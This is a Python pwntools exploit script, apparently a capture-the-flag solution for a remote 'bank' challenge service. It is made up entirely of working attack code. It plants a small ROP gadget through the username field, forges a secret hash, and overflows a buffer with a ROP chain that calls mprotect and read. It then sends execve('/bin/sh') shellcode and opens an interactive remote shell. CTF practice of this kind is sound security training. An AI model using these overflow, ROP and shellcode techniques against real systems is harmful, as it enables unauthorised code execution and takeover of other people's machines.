from pwn import *
from Crypto.Hash import SHA256

#context.log_level = "debug"
HOST = "pwn.sect.ctf.rocks" 
PORT = 31337
#conn = process("./bank")
conn = remote(HOST, PORT)
name = "A" * 8
conn.sendafter("Username: ", name)
conn.recvuntil(name)
rand_num = conn.recvuntil('\n')[:-1]
conn_secret = process(["./generate_secret", str(u32(rand_num))])
rand_secret = conn_secret.recvall()
conn.sendafter("#> ", "1")
asm_code = asm('''
pop rax
pop rdi
pop rsi
pop rdx
syscall
ret
''', arch="x86_64", os="linux", bits=64)
name = asm_code + "A" * (8 - len(asm_code))
conn.sendafter("Enter username: ", name)
secret_content = (name + rand_num[0] + rand_secret)[:0x30d40]
conn_secret.close()
h = SHA256.new()
h.update(bytes(secret_content))
secret_hash = h.hexdigest()
log.success("secret hash :%s" % secret_hash)
conn.sendafter("#> ", "2")
conn.sendafter("Please enter your secure hash: ", secret_hash)
payload = "A" * 0x18
#pop rax; pop rdi; pop rsi; pop rdx; syscall
payload += p64(0x40000)
#mprotect
payload += p64(10)
payload += p64(0x40000) 
payload += p64(0x30d40)
payload += p64(0x7)

#pop rax; pop rdi; pop rsi; pop rdx; syscall
payload += p64(0x40000)
#read
payload += p64(0)
payload += p64(0) 
payload += p64(0x40000)
payload += p64(0x100)

payload += p64(0x40008)
conn.sendafter("The secure hash is correct! How much do you want to withdraw?: ", payload)
shellcode = asm('''
xor rax,rax
mov al, 59
xor rsi, rsi
xor rdx, rdx
mov rdi, 0x40000
syscall
''', arch="x86_64", os="linux", bits=64)
conn.send('/bin/sh\x00' + shellcode)
conn.interactive()
